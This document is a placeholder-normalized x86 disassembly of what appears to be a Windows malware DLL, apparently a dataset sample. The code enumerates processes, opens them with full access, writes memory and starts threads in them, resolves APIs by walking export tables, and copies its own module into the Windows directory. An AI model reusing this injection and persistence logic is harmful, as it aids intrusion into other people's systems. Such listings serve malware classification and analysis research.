add esp 0x9c
retn
cmp eax 0x1
jne r-xdata
cmp [ esp + 0x9e ] 0x1
jne r-xdata
test eax eax
jne r-xdata
mov eax 0x20
pop esi
mov [ rw-data ] eax
add esp 0x9c
retn
mov eax 0x100
pop esi
mov [ rw-data ] eax
add esp 0x9c
retn
mov eax 0x200
pop esi
mov [ rw-data ] eax
add esp 0x9c
retn
mov eax 0x80
pop esi
mov [ rw-data ] eax
add esp 0x9c
retn
mov eax 0x10
pop esi
mov [ rw-data ] eax
add esp 0x9c
retn
sub_10002290
mov eax [ rw-data ]
sub esp 0x114
test eax eax
push esi
jne r-xdata
mov esi [ esp + 0x11c ]
push esi
push eax
call [ GetProcAddress@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x14 ]
push 0x104
push eax
call [ GetSystemDirectoryA@IAT ]
lea ecx [ esp + 0x14 ]
push rw-data
push ecx
call [ lstrcatA@IAT ]
lea edx [ esp + 0x14 ]
push edx
call [ LoadLibraryA@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
pop esi
add esp 0x114
retn 0x4
mov eax esi
shr eax 0x10
jne r-xdata
push 0xffffffff
call [ ExitProcess@IAT ]
push 0xfffffffe
call [ ExitProcess@IAT ]
push esi
lea ecx [ esp + 0x8 ]
push rw-data
push ecx
call [ wsprintfA@IAT ]
add esp 0xc
sub_10002320
mov eax [ esp + 0x8 ]
sub esp 0xa28
mov ecx 0x1
push ebx
push ebp
push esi
cmp eax ecx
push edi
je r-xdata
cmp [ rw-data ] ecx
jne r-xdata
cmp eax 0x2
je r-xdata
mov [ rw-data ] ecx
xor ebx ebx
mov ecx 0x4a
xor eax eax
lea edi [ esp + 0x179 ]
mov [ esp + 0x178 ] bl
[ edi ]
stosw [ edi ]
mov esi [ GetModuleFileNameA@IAT ]
push 0x12b
stosb [ edi ]
lea eax [ esp + 0x17c ]
push eax
push ebx
call esi
lea ecx [ esp + 0x178 ]
push ecx
call sub_1000c5c0
mov ecx 0x4a
xor eax eax
lea edi [ esp + 0x3d5 ]
mov [ esp + 0x3d4 ] bl
[ edi ]
mov ebp [ esp + 0xa40 ]
add esp 0x4
stosw [ edi ]
lea edx [ esp + 0x3d0 ]
push 0x12b
push edx
push ebp
stosb [ edi ]
call esi
mov ecx 0x4a
xor eax eax
lea edi [ esp + 0x2a5 ]
mov [ esp + 0x2a4 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x4a
xor eax eax
lea edi [ esp + 0x705 ]
mov [ esp + 0x704 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x704 ]
push 0x12c
push eax
call [ GetWindowsDirectoryA@IAT ]
lea ecx [ esp + 0x704 ]
lea edx [ esp + 0x2a4 ]
push ecx
push rw-data
push 0x12b
push edx
call sub_1000452d
lea eax [ esp + 0x188 ]
push rw-data
push eax
call sub_10004580
add esp 0x18
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax ecx
pop ebx
add esp 0xa28
retn 0xc
test eax eax
jne r-xdata
lea eax [ esp + 0x178 ]
push rw-data
push eax
call sub_10004580
add esp 0x8
test eax eax
je r-xdata
lea ecx [ esp + 0x2a4 ]
lea edx [ esp + 0x3d0 ]
push ecx
push edx
call sub_10009820
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0xa28
retn 0xc
push 0x2
call sub_10001a00
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0xa28
retn 0xc
push 0x1
mov [ rw-data ] ebp
call sub_10001a00
lea edx [ esp + 0x2a8 ]
lea eax [ esp + 0x3d4 ]
push edx
push eax
call sub_10009820
add esp 0xc
test eax eax
je r-xdata
mov ecx 0x4a
xor eax eax
lea edi [ esp + 0x4fd ]
mov [ esp + 0x4fc ] bl
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0x4fc ]
push 0x12b
push ecx
push ebp
stosb [ edi ]
call esi
mov ecx 0x4a
xor eax eax
lea edi [ esp + 0x4d ]
mov [ esp + 0x4c ] bl
[ edi ]
stosw [ edi ]
lea edx [ esp + 0x4c ]
push 0x12c
push edx
stosb [ edi ]
call [ GetWindowsDirectoryA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x4c ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x4c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_10003410
add esp 0x4
test eax eax
je r-xdata
mov ecx 0x81
xor eax eax
lea edi [ esp + 0x4fe ]
mov [ esp + 0x4fc ] bx
[ edi ]
stosw [ edi ]
lea eax [ esp + 0x4fc ]
push 0x103
push eax
push ebp
call [ GetModuleFileNameW@IAT ]
mov ecx 0xe
mov esi rw-data
lea edi [ esp + 0x830 ]
xor eax eax
[ edi ] [ esi ]
mov ecx 0x74
lea edi [ esp + 0x868 ]
[ edi ]
lea ecx [ esp + 0x830 ]
lea edx [ esp + 0x4fc ]
push ecx
push edx
call sub_10001050
mov ecx 0xf
xor eax eax
lea edi [ esp + 0x18 ]
add esp 0x8
[ edi ]
mov eax rw-data
push rw-data
mov [ esp + 0x14 ] 0x3c
mov [ esp + 0x18 ] 0x40
mov [ esp + 0x24 ] rw-data
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x5
call [ LoadLibraryW@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
call eax
test eax eax
je r-xdata
push ebp
call [ DisableThreadLibraryCalls@IAT ]
call sub_10001ea0
lea edx [ esp + 0x4c ]
push 0x1
lea eax [ esp + 0x500 ]
push edx
push eax
call [ CopyFileA@IAT ]
lea ecx [ esp + 0x4c ]
push ecx
call sub_10001d10
add esp 0x4
push 0x1
call [ ExitProcess@IAT ]
mov ecx 0x4a
xor eax eax
lea edi [ esp + 0x831 ]
mov [ esp + 0x830 ] bl
[ edi ]
lea ecx [ esp + 0x4c ]
lea edx [ esp + 0x830 ]
stosw [ edi ]
push ecx
push rw-data
push 0x12b
push edx
stosb [ edi ]
call sub_1000452d
lea eax [ esp + 0x840 ]
lea ecx [ esp + 0x5c ]
push eax
push ecx
call sub_100044ff
add esp 0x18
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xa28
retn 0xc
mov eax [ esp + 0x48 ]
cmp eax ebx
je r-xdata
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
mov edx [ esp + 0x48 ]
push edx
call [ CloseHandle@IAT ]
sub_10003430
sub esp 0x8
push esi
push edi
mov edi [ esp + 0x14 ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push edi
call [ CreateFileA@IAT ]
mov esi [ esp + 0x18 ]
cmp eax 0xffffffff
mov [ esi + 0x200 ] eax
jne r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x8 ] 0x0
push ecx
push eax
mov [ esp + 0x14 ] 0x0
call [ GetFileSizeEx@IAT ]
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
add esp 0x8
retn
pop edi
mov eax 0x1
pop esi
add esp 0x8
retn
mov edx [ esp + 0x8 ]
mov ecx [ esi + 0x200 ]
mov eax [ esp + 0xc ]
push 0x0
push 0x0
push 0x0
push 0x4000002
push 0x0
mov [ esi + 0x210 ] edx
push ecx
mov [ esi + 0x214 ] eax
call [ CreateFileMappingA@IAT ]
test eax eax
mov [ esi + 0x204 ] eax
je r-xdata
push 0x1ff
push edi
push esi
call sub_10003e60
mov edx [ esi + 0x204 ]
add esp 0xc
push 0x0
push 0x0
push 0x0
push 0x4
push edx
call [ MapViewOfFile@IAT ]
mov [ esi + 0x208 ] eax
sub_10003500
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
xor edi edi
mov eax [ esi + 0x208 ]
cmp eax edi
je r-xdata
mov eax [ esi + 0x204 ]
mov ebx [ CloseHandle@IAT ]
cmp eax edi
je r-xdata
push eax
call [ UnmapViewOfFile@IAT ]
mov [ esi + 0x208 ] edi
mov eax [ esi + 0x200 ]
cmp eax edi
je r-xdata
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x210 ] edi
mov [ esi + 0x214 ] edi
pop edi
pop esi
mov eax 0x1
pop ebx
retn
cmp eax 0xffffffff
je r-xdata
push eax
call ebx
mov [ esi + 0x204 ] edi
push eax
call ebx
mov [ esi + 0x200 ] edi
sub_10003570
sub esp 0x130
push ebx
xor ebx ebx
push esi
push ebx
push 0x2
mov [ esp + 0x18 ] 0x128
call CreateToolhelp32Snapshot
mov esi eax
test esi esi
jne r-xdata
push ebp
lea eax [ esp + 0xc ]
push edi
push eax
mov [ esp + 0x14 ] 0xffffffff
call [ GetCurrentProcessId@IAT ]
mov edi [ ProcessIdToSessionId@IAT ]
push eax
call edi
lea ecx [ esp + 0x18 ]
push ecx
push esi
call Process32First
test eax eax
je r-xdata
pop esi
pop ebx
add esp 0x130
retn
push esi
call [ CloseHandle@IAT ]
pop edi
pop ebp
mov eax ebx
pop esi
pop ebx
add esp 0x130
retn
mov ebp [ esp + 0x144 ]
lea eax [ esp + 0x18 ]
push eax
push esi
call Process32Next
test eax eax
jne r-xdata
mov ecx [ esp + 0x20 ]
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x14 ]
push eax
push ecx
call edi
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
cmp edx eax
je r-xdata
lea edx [ esp + 0x3c ]
push ebp
push edx
call sub_10003f90
add esp 0x4
push eax
call sub_10003eb0
add esp 0x8
test eax eax
jne r-xdata
push esi
call [ CloseHandle@IAT ]
pop edi
pop ebp
mov eax ebx
pop esi
pop ebx
add esp 0x130
retn
mov ebx [ esp + 0x20 ]
sub_10003650
sub esp 0x130
push ebp
push edi
xor ebp ebp
mov ecx 0x49
xor eax eax
lea edi [ esp + 0x14 ]
mov [ esp + 0x10 ] ebp
[ edi ]
call sub_10003640
mov edi eax
cmp edi 0xffffffff
jne r-xdata
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] 0x128
push eax
push edi
call Process32First
test eax eax
jne r-xdata
pop edi
xor eax eax
pop ebp
add esp 0x130
retn
push ebx
lea ecx [ esp + 0xc ]
push esi
push ecx
mov [ esp + 0x14 ] 0xffffffff
call [ GetCurrentProcessId@IAT ]
mov ebx [ ProcessIdToSessionId@IAT ]
push eax
call ebx
mov esi [ esp + 0x144 ]
pop edi
pop ebp
add esp 0x130
retn
lea edx [ esp + 0x3c ]
push eax
push edx
push esi
call sub_10003f00
add esp 0xc
test eax eax
jne r-xdata
mov eax 0xf
lea eax [ esp + 0x18 ]
push eax
push edi
call Process32Next
test eax eax
je r-xdata
mov ecx [ esp + 0x20 ]
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x14 ]
push eax
push ecx
call ebx
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
cmp edx eax
je r-xdata
push edi
call [ CloseHandle@IAT ]
pop esi
pop ebx
mov eax ebp
pop edi
pop ebp
add esp 0x130
retn
jmp r-xdata
mov ebp [ esp + 0x20 ]
push esi
call sub_10003f50
add esp 0x4
cmp eax 0xf
jl r-xdata
sub_10003750
sub esp 0x10
mov ecx [ esp + 0x18 ]
lea eax [ esp + 0x4 ]
push eax
push ecx
push 0x0
mov [ esp + 0xc ] 0x1
call [ rw-data ]
mov eax [ esp + 0x14 ]
push 0x0
push 0x0
lea edx [ esp + 0x8 ]
push 0x10
push edx
push 0x0
push eax
mov [ esp + 0x24 ] 0x2
call [ rw-data ]
add esp 0x10
retn
sub_100037c0
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x14 ]
push edi
mov edi [ esp + 0x14 ]
push 0x0
push 0x0
push esi
push edi
push 0x0
push 0x0
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn
push eax
push eax
push esi
push edi
push eax
push eax
push ebx
call sub_10003b50
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_10003810
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
test edi edi
jne r-xdata
push 0x40
push edi
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x8
mov eax [ edi + 0x3c ]
mov eax [ eax + edi + 0x78 ]
add eax edi
cmp eax edi
je r-xdata
mov esi [ eax + 0x20 ]
mov ebp [ eax + 0x1c ]
mov ebx [ eax + 0x24 ]
add esi edi
add ebp edi
add ebx edi
mov ecx [ esi ]
lea eax [ ecx + edi ]
test eax eax
je r-xdata
mov edx [ esp + 0x18 ]
push edx
push eax
call sub_10003eb0
add esp 0x8
test eax eax
je r-xdata
xor ecx ecx
mov cx [ ebx ]
mov eax [ ebp + ecx * 4 ]
add eax edi
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
mov eax [ esi + 0x4 ]
add esi 0x4
add eax edi
add ebx 0x2
test eax eax
jne r-xdata
sub_100038c0
mov eax [ esp + 0xc ]
sub esp 0x40c
cmp eax 0xffffffff
push ebx
push esi
push edi
mov ebx eax
jne r-xdata
xor edi edi
cmp ebx edi
mov [ esp + 0xc ] edi
je r-xdata
mov eax [ esp + 0x41c ]
push eax
call sub_10003740
add esp 0x4
mov ebx eax
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x40c
retn
push 0x400
lea ecx [ esp + 0x14 ]
push edi
push ecx
call sub_10003e10
mov edx [ esp + 0x42c ]
push 0x3ff
lea eax [ esp + 0x20 ]
push edx
push eax
call sub_10003e60
add esp 0x18
push rw-data
call [ GetModuleHandleA@IAT ]
mov esi eax
mov eax [ rw-data ]
cmp eax edi
jne r-xdata
cmp [ rw-data ] edi
jne r-xdata
push rw-data
push esi
call sub_10003810
mov [ rw-data ] eax
cmp [ rw-data ] edi
jne r-xdata
push rw-data
push esi
call sub_10003810
mov [ rw-data ] eax
cmp [ rw-data ] edi
jne r-xdata
push rw-data
push esi
call sub_10003810
mov [ rw-data ] eax
push rw-data
push esi
call sub_10003810
push rw-data
mov [ esp + 0x418 ] eax
call [ LoadLibraryA@IAT ]
mov esi eax
cmp esi edi
je r-xdata
push rw-data
push esi
call sub_10003810
mov [ rw-data ] eax
cmp [ rw-data ] edi
jne r-xdata
cmp [ rw-data ] edi
jne r-xdata
push rw-data
push esi
call sub_10003810
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp eax edi
jne r-xdata
push rw-data
push esi
call sub_10003810
mov [ rw-data ] eax
cmp [ rw-data ] edi
je r-xdata
push rw-data
push esi
call sub_10003810
mov [ rw-data ] eax
cmp eax edi
je r-xdata
cmp [ rw-data ] edi
je r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
cmp [ rw-data ] edi
je r-xdata
cmp [ rw-data ] edi
je r-xdata
lea ecx [ esp + 0xc ]
push ebp
push ecx
push 0x20
mov [ esp + 0x41c ] eax
call [ GetCurrentProcess@IAT ]
push eax
call [ rw-data ]
mov edx [ esp + 0x10 ]
push rw-data
push edx
call sub_10003750
add esp 0x8
push ebx
push edi
push 0x1f0fff
call [ rw-data ]
mov esi eax
cmp esi edi
je r-xdata
mov eax [ esp + 0x10 ]
mov ebx [ CloseHandle@IAT ]
test eax eax
pop ebp
je r-xdata
push 0x408
push esi
call sub_100038a0
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
test esi esi
je r-xdata
push eax
call ebx
push 0x0
lea eax [ esp + 0x18 ]
push 0x408
push eax
push ebp
push esi
call [ rw-data ]
test eax eax
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
add esp 0x40c
retn
push esi
call ebx
push 0x3e8
push esi
call sub_100038a0
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
push 0x0
push 0x3e8
push sub_100037a0
push ebx
push esi
call [ rw-data ]
test eax eax
je r-xdata
mov eax [ esp + 0x42c ]
test eax eax
je r-xdata
push 0x0
push 0x0
push ebp
push ebx
push 0x0
push 0x0
push esi
call [ rw-data ]
mov edi eax
neg edi
sbb edi edi
neg edi
push ebp
push ebx
push esi
call sub_100037c0
add esp 0xc
mov edi eax
jmp r-xdata
sub_10003b50
sub esp 0x310
push ebx
push ebp
push esi
push edi
push rw-data
call [ GetModuleHandleA@IAT ]
mov esi eax
push rw-data
push esi
call sub_10003810
push rw-data
push esi
mov [ rw-data ] eax
call sub_10003810
push rw-data
push esi
mov [ rw-data ] eax
call sub_10003810
push rw-data
push esi
mov [ rw-data ] eax
call sub_10003810
push rw-data
push esi
mov [ rw-data ] eax
call sub_10003810
push rw-data
push esi
mov [ rw-data ] eax
call sub_10003810
push rw-data
push esi
mov [ rw-data ] eax
call sub_10003810
mov ebp eax
mov ecx 0xb2
xor eax eax
lea edi [ esp + 0x58 ]
mov [ esp + 0x54 ] 0x10007
mov esi [ esp + 0x324 ]
[ edi ]
or al 0xff
mov ebx 0x1000
mov cl 0x8b
mov [ esp + 0x19 ] al
mov [ esp + 0x1f ] al
mov [ esp + 0x23 ] al
push 0x40
lea eax [ esp + 0x18 ]
xor edi edi
mov [ esp + 0x1c ] cl
mov [ esp + 0x1f ] cl
push ebx
push eax
lea ecx [ esp + 0x3c ]
push edi
push ecx
push esi
mov [ esp + 0x40 ] edi
mov [ esp + 0x44 ] ebx
mov [ esp + 0x28 ] edi
mov [ esp + 0x32 ] 0x55
mov [ esp + 0x34 ] 0xec
mov [ esp + 0x35 ] 0x51
mov [ esp + 0x36 ] 0x53
mov [ esp + 0x38 ] 0xd0
mov [ esp + 0x39 ] 0x59
mov [ esp + 0x3a ] 0x50
mov [ esp + 0x3c ] 0xd1
mov [ esp + 0x3d ] 0x90
mov [ esp + 0x48 ] edi
mov [ esp + 0x2c ] ebx
call [ rw-data ]
cmp eax 0x80000000
jae r-xdata
mov eax [ esp + 0x28 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x310
retn 0x1c
mov ecx [ esp + 0x30 ]
lea edx [ esp + 0x34 ]
push edx
lea eax [ esp + 0x1c ]
push 0xe
push eax
push ecx
push esi
call [ rw-data ]
cmp eax 0x80000000
jae r-xdata
push 0x4
lea edx [ esp + 0x18 ]
push 0x2000
push edx
lea eax [ esp + 0x1c ]
push edi
push eax
push esi
mov [ esp + 0x50 ] esi
mov [ esp + 0x2c ] 0x10000
call [ rw-data ]
cmp eax 0x80000000
jae r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov [ esp + 0x50 ] ecx
push 0x4
lea edx [ eax + ecx ]
push ebx
mov [ esp + 0x50 ] edx
mov edx [ esp + 0x34 ]
sub eax edx
add edx ebx
mov [ esp + 0x34 ] edx
lea edx [ esp + 0x18 ]
lea eax [ ecx + eax - 0x1000 ]
lea ecx [ esp + 0x34 ]
push ecx
push edi
push edx
push esi
mov [ esp + 0x28 ] eax
call [ rw-data ]
cmp eax 0x80000000
jae r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x34 ]
mov [ esp + 0x4c ] eax
push ecx
lea edx [ esp + 0x18 ]
push 0x104
lea eax [ esp + 0x18 ]
push edx
push eax
push esi
mov [ esp + 0x28 ] ebx
call [ rw-data ]
cmp eax 0x80000000
jae r-xdata
mov eax [ esp + 0x4c ]
lea ecx [ esp + 0x54 ]
sub eax ebx
push ecx
mov [ esp + 0x50 ] eax
call [ GetCurrentThread@IAT ]
push eax
call [ rw-data ]
cmp eax 0x80000000
jae r-xdata
mov edx [ esp + 0x48 ]
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x334 ]
mov [ esp + 0x118 ] edx
mov edx [ esp + 0x330 ]
mov [ esp + 0x10c ] eax
mov [ esp + 0xf8 ] ecx
lea eax [ esp + 0x40 ]
mov [ esp + 0x104 ] edx
push 0x1
lea ecx [ esp + 0x58 ]
push eax
lea edx [ esp + 0x40 ]
push ecx
push edx
push esi
push edi
lea eax [ esp + 0x40 ]
push 0x1f03ff
push eax
mov [ esp + 0x120 ] ebp
mov [ esp + 0x11c ] edi
call [ rw-data ]
cmp eax 0x80000000
jae r-xdata
mov eax [ esp + 0x33c ]
cmp eax edi
je r-xdata
test [ esp + 0x338 ] 0x4
jne r-xdata
mov ecx [ esp + 0x3c ]
mov [ eax ] ecx
mov edx [ esp + 0x28 ]
push edi
push edx
call [ rw-data ]
sub_10003e10
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
xor eax eax
pop esi
retn
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push ecx
push edx
push esi
call eax
add esp 0xc
pop esi
retn
push rw-data
call [ GetModuleHandleA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
sub_10003e60
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
xor eax eax
pop esi
retn
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push ecx
push edx
push esi
call eax
add esp 0xc
pop esi
retn
push rw-data
call [ GetModuleHandleA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
sub_10003eb0
push esi
push edi
mov edi [ esp + 0xc ]
test edi edi
je r-xdata
pop edi
or eax 0xffffffff
pop esi
retn
mov esi [ esp + 0x10 ]
test esi esi
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push esi
push edi
call eax
add esp 0x8
pop edi
pop esi
retn
push rw-data
call [ GetModuleHandleA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
sub_10003f00
push esi
push edi
mov edi [ esp + 0xc ]
test edi edi
je r-xdata
pop edi
or eax 0xffffffff
pop esi
retn
mov esi [ esp + 0x10 ]
test esi esi
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x14 ]
push ecx
push esi
push edi
call eax
add esp 0xc
pop edi
pop esi
retn
push rw-data
call [ GetModuleHandleA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
sub_10003f50
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
xor eax eax
pop esi
retn
push esi
call eax
add esp 0x4
pop esi
retn
push rw-data
call [ GetModuleHandleA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
sub_10003f90
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
xor eax eax
pop esi
retn
push esi
call eax
add esp 0x4
pop esi
retn
push rw-data
call [ GetModuleHandleA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
sub_10003fd0
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
dec ecx
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
dec ecx
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
inc edi
dec ecx
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
dec ebx
jne r-xdata
dec ebx
jne r-xdata
xor eax eax
mov [ edi ] al
inc edi
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
dec ecx
jne r-xdata
add edi 0x4
xor eax eax
dec ecx
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_100040dc
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
jne r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
push [ ebp + 0xc ]
call sub_100047df
pop ecx
jmp r-xdata
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
push ebx
call sub_1000440b
pop ecx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x2
jne r-xdata
mov [ ebp - 0x24 ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
cmp esi 0xffffffe0
ja r-xdata
mov eax [ ebp - 0x24 ]
cmp eax edi
jne r-xdata
push 0x9
call sub_10005bc2
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_10004961
pop ecx
mov [ ebp - 0x28 ] eax
cmp eax edi
je r-xdata
cmp eax edi
jne r-xdata
cmp esi edi
jne r-xdata
mov [ ebp - 0x24 ] edi
cmp esi 0xffffffe0
ja r-xdata
cmp esi edi
jbe r-xdata
cmp [ rw-data ] edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_10004267
cmp [ ebp - 0x28 ] edi
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push ebx
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
push 0x1
pop esi
mov eax [ ebp - 0x24 ]
cmp eax edi
jne r-xdata
push 0x9
call sub_10005bc2
pop ecx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x38 ]
push eax
push ebx
call sub_100056bc
add esp 0xc
mov edi eax
mov [ ebp - 0x30 ] edi
test edi edi
je r-xdata
push 0x10
pop esi
add esi 0xf
and esi 0xfffffff0
jmp r-xdata
push esi
call sub_10005c38
pop ecx
test eax eax
jne r-xdata
cmp esi edi
jne r-xdata
cmp [ ebp - 0x24 ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_1000516a
add esp 0xc
test eax eax
je r-xdata
push esi
call sub_10005c38
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov [ ebp - 0x24 ] eax
cmp esi [ rw-data ]
jae r-xdata
mov [ ebp + 0xc ] esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov [ ebp - 0x24 ] eax
push 0x1
pop esi
cmp esi edi
jne r-xdata
push esi
call sub_10004cb5
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x24 ] ebx
jmp r-xdata
push esi
call sub_10005c38
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov ebx esi
shr ebx 0x4
push ebx
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x38 ]
call sub_10005a84
add esp 0x10
test eax eax
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x24 ] eax
cmp eax edi
je r-xdata
push 0x1
pop esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
mov [ ebp - 0x20 ] eax
cmp eax esi
jb r-xdata
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_100043b5
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x24 ] eax
test eax eax
je r-xdata
push ebx
call sub_10005758
pop ecx
mov [ ebp - 0x24 ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax [ ebx - 0x4 ]
dec eax
mov [ ebp - 0x20 ] eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x24 ]
call sub_10005ed0
push ebx
call sub_10004961
mov [ ebp - 0x28 ] eax
push ebx
push eax
call sub_1000498c
add esp 0x18
mov eax esi
movzx eax [ edi ]
shl eax 0x4
mov [ ebp - 0x34 ] eax
cmp eax esi
jb r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ edi ]
shl eax 0x4
mov [ ebp - 0x34 ] eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x24 ]
call sub_10005ed0
push ebx
push [ ebp - 0x28 ]
call sub_1000498c
